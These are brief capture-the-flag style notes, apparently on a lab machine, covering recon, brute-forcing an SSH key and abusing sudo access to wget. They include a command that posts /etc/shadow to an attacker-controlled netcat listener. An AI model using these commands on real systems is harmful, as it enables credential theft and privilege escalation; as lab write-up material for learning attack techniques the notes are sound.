only http and ssh open

there is a comment containing a name, possibly user.

There is a .ssh file in the webserver, BRUTEFORCE PROPERLY

user have sudo access to `wget`

`wget` can be used to upload file(data exfiltration), so with sudo it can be used to upload high-privileged file like /etc/shadow or files in the /root directory:
```bash
sudo wget --post-file=/etc/shadow 10.4.50.18 #victim machine
nc -lvnp 80 > output #attacker machine
```

Guessing the filename based on the user flag, you get the root flag